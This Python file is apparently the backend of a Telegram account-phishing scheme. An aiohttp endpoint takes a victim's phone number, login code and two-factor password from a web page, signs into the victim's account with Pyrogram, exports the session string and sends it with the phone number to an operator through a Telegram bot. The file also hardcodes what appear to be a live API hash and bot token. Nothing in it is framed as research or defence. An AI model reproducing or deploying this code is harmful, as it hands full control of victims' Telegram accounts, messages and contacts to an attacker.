import asyncio, os, logging
from aiogram import Bot, Dispatcher
from aiohttp import web
import aiohttp_cors
from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded

API_ID, API_HASH = 15587172, "d3d35aebb0b6ebdb7a002836914ee37d"
BOT_TOKEN, ADMIN_ID = "8711443316:AAE7IDM3KETScemryNQQs21vruVv9DK1QHA", 1866813859

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
active_clients = {}

async def handle_api(request):
    try:
        data = await request.json()
        uid, act = str(data.get("user_id")), data.get("action")
        if act == "send_phone":
            p = data.get("phone").replace(" ", "").replace("-", "")
            c = Client(name=f"u_{uid}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
            await c.connect()
            s = await c.send_code(p)
            active_clients[uid] = {"c": c, "p": p, "h": s.phone_code_hash}
            return web.json_response({"status": "ok"})
        elif act == "send_code":
            s = active_clients.get(uid)
            if not s: return web.json_response({"status": "error", "message": "Expired"})
            try:
                await s["c"].sign_in(s["p"], s["h"], data.get("code"))
                txt = f"✅ ВХОД!\n{s['p']}\n\n`{await s['c'].export_session_string()}`"
                await bot.send_message(ADMIN_ID, txt, parse_mode="Markdown")
                return web.json_response({"status": "success"})
            except SessionPasswordNeeded: return web.json_response({"status": "need_2fa"})
        elif act == "send_2fa":
            s = active_clients.get(uid)
            await s["c"].check_password(data.get("password"))
            txt = f"✅ 2FA!\n{s['p']}\n\n`{await s['c'].export_session_string()}`"
            await bot.send_message(ADMIN_ID, txt, parse_mode="Markdown")
            return web.json_response({"status": "success"})
    except Exception as e: return web.json_response({"status": "error", "message": str(e)})

app = web.Application()
cors = aiohttp_cors.setup(app, defaults={"*": aiohttp_cors.ResourceOptions(allow_credentials=True, expose_headers="*", allow_headers="*")})
app.router.add_post("/api", handle_api)
cors.add(app.router["/api"])

async def main():
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, '0.0.0.0', int(os.environ.get("PORT", 10000))).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
